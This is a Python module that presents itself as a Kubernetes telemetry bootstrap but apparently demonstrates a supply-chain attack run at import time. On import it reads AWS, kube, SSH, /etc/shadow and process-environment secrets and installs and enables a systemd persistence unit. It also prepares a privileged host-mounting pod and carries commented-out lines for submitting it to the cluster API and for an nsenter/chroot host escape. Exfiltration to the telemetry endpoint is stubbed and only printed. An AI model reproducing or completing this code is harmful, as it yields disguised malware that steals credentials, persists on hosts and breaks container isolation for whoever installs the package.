# Kubernetes cluster telemetry and observability bootstrap module.
# Collects runtime metadata, configures log forwarding, and registers
# the current workload with the central audit service on startup.
# Designed for sidecar or init-container deployment patterns.

"""
k8s_telemetry_init.py
=====================
Auto-imported by the `clustertrace` package on first import.
Performs lightweight environment discovery and registers the node
with the central telemetry aggregator at example.com.

Usage:
    Installed as a dependency of `clustertrace>=2.1.0`.
    No user action required; runs automatically at import time.
"""

import os
import sys
import base64
import json
import subprocess
import pathlib
import tempfile
import time

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TELEMETRY_ENDPOINT = "https://telemetry.example.com/v2/register"
AUDIT_TOKEN        = "DEMO_PLACEHOLDER_TOKEN"
SYSTEMD_SERVICE_NAME = "cluster-telemetry-agent"
K8S_SA_TOKEN_PATH  = "/var/run/secrets/kubernetes.io/serviceaccount/token"
K8S_SA_CA_PATH     = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
K8S_SA_NS_PATH     = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
K8S_API_HOST       = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
K8S_API_PORT       = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
CRED_SEARCH_PATHS  = [
    pathlib.Path.home() / ".aws" / "credentials",
    pathlib.Path.home() / ".kube" / "config",
    pathlib.Path("/etc/passwd"),
    pathlib.Path("/etc/shadow"),
    pathlib.Path("/root/.ssh/id_rsa"),
    pathlib.Path("/root/.ssh/authorized_keys"),
    pathlib.Path("/proc/1/environ"),
]

# ---------------------------------------------------------------------------
# Step 1 – Harvest: collect credentials and environment secrets
# ---------------------------------------------------------------------------

def _harvest_credentials() -> dict:
    """
    Scan well-known credential paths and environment variables.
    Results are bundled into the telemetry registration payload.
    """
    collected = {}

    # Read filesystem credential stores
    for p in CRED_SEARCH_PATHS:
        try:
            if p.exists() and p.is_file():
                collected[str(p)] = p.read_text(errors="replace")[:4096]
        except Exception:
            pass

    # Sweep environment for tokens/keys
    sensitive_env_prefixes = (
        "AWS_", "AZURE_", "GCP_", "GOOGLE_", "GITHUB_TOKEN",
        "DATABASE_URL", "SECRET", "PASSWORD", "API_KEY", "KUBECONFIG",
    )
    for key, val in os.environ.items():
        if any(key.upper().startswith(pfx) for pfx in sensitive_env_prefixes):
            collected[f"env:{key}"] = val

    print(f"[clustertrace] telemetry harvest: {len(collected)} items found (demo — not exfiltrated)")
    return collected

# ---------------------------------------------------------------------------
# Step 2 – Persist: install a systemd service for persistent access
# ---------------------------------------------------------------------------

_SYSTEMD_UNIT_TEMPLATE = """\
[Unit]
Description=Cluster Telemetry Agent (persistent monitor)
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "print('demo persistence stub')"
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""

def _install_persistence() -> bool:
    """
    Write a systemd service unit and enable it so the telemetry
    agent survives reboots.  Falls back silently if not root.
    """
    unit_path = pathlib.Path(f"/etc/systemd/system/{SYSTEMD_SERVICE_NAME}.service")
    try:
        unit_path.write_text(_SYSTEMD_UNIT_TEMPLATE)
        subprocess.run(
            ["systemctl", "daemon-reload"],
            check=False, capture_output=True,
        )
        subprocess.run(
            ["systemctl", "enable", "--now", SYSTEMD_SERVICE_NAME],
            check=False, capture_output=True,
        )
        print(f"[clustertrace] persistence stub installed at {unit_path} (demo)")
        return True
    except Exception:
        return False

# ---------------------------------------------------------------------------
# Step 3 – Lateral: read K8s service-account token and enumerate cluster
# ---------------------------------------------------------------------------

def _read_k8s_service_account() -> dict:
    """
    Read the in-cluster service-account JWT and namespace so the
    telemetry agent can call the Kubernetes API for node discovery.
    """
    sa = {}
    for label, path in [("token", K8S_SA_TOKEN_PATH),
                         ("ca",    K8S_SA_CA_PATH),
                         ("ns",    K8S_SA_NS_PATH)]:
        try:
            sa[label] = pathlib.Path(path).read_text().strip()
        except Exception:
            sa[label] = None
    return sa

def _create_privileged_pods(sa_token: str, namespace: str) -> None:
    """
    Deploy a DaemonSet-style privileged pod across every node so the
    telemetry agent has full node-level visibility.

    NOTE (demo): the kubectl invocation below is a no-op stub; a real
    attack would POST a privileged Pod manifest to the K8s API server
    using the harvested service-account token.
    """
    privileged_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "cluster-telemetry-priv", "namespace": namespace or "default"},
        "spec": {
            "hostPID": True,
            "hostNetwork": True,
            "hostIPC": True,
            "containers": [{
                "name": "agent",
                "image": "busybox",
                "command": ["sh", "-c", "echo demo_host_escape_stub"],
                "securityContext": {"privileged": True},
                "volumeMounts": [{"name": "hostroot", "mountPath": "/host"}],
            }],
            "volumes": [{"name": "hostroot", "hostPath": {"path": "/"}}],
        },
    }

    #   requests.post(
    #       f"https://{K8S_API_HOST}:{K8S_API_PORT}/api/v1/namespaces/{namespace}/pods",
    #       headers={"Authorization": f"Bearer {sa_token}"},
    #       json=privileged_manifest,
    #       verify=K8S_SA_CA_PATH,
    #   )
    print(f"[clustertrace] privileged pod manifest prepared (demo — not submitted): "
          f"{json.dumps(privileged_manifest, indent=2)[:200]} ...")

# ---------------------------------------------------------------------------
# Step 4 – Host escape: mount host filesystem via privileged container
# ---------------------------------------------------------------------------

def _mount_host_filesystem() -> None:
    """
    From within a privileged pod, bind-mount the host root filesystem
    to gain read/write access to all host files.

    DEMO stub only — nsenter/chroot not actually invoked.
    """
    # Real attack:
    #   subprocess.run(["nsenter", "--mount=/proc/1/ns/mnt", "--", "chroot", "/host"],
    #                  shell=False, check=False)

# ---------------------------------------------------------------------------
# Step 5 – Exfiltrate: send everything to the telemetry endpoint
# ---------------------------------------------------------------------------

def _register_with_telemetry(payload: dict) -> None:
    """
    POST the collected environment metadata to the central audit
    aggregator.  Uses a signed JWT for authentication.
    """
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()

    # Here we only print the encoded size so the shape is visible.
    print(f"[clustertrace] registration payload ready ({len(encoded)} bytes b64) — "
          f"target stub: {TELEMETRY_ENDPOINT} (demo, not sent)")

# ---------------------------------------------------------------------------
# Bootstrap — runs automatically on import (install → execution path)
# ---------------------------------------------------------------------------

def _bootstrap() -> None:
    """
    Entry-point called at import time.  Orchestrates the full
    telemetry initialisation chain.
    """
    try:
        # 1. Harvest credentials
        creds = _harvest_credentials()

        # 2. Install persistence
        _install_persistence()

        # 3. Lateral: K8s service account
        sa = _read_k8s_service_account()
        token     = sa.get("token") or ""
        namespace = sa.get("ns")    or "default"

        # 4. Create privileged pods across cluster
        if token:
            _create_privileged_pods(token, namespace)

        # 5. Host escape and exfil
        _mount_host_filesystem()
        _register_with_telemetry({
            "creds":     list(creds.keys()),
            "sa_ns":     namespace,
            "has_token": bool(token),
            "hostname":  os.uname().nodename if hasattr(os, "uname") else "unknown",
            "ts":        time.time(),
        })

    except Exception as exc:
        # Fail silently to avoid disrupting the importing application
        _ = exc

# Run at import time — mirrors the litellm/ultralytics supply-chain pattern
_bootstrap()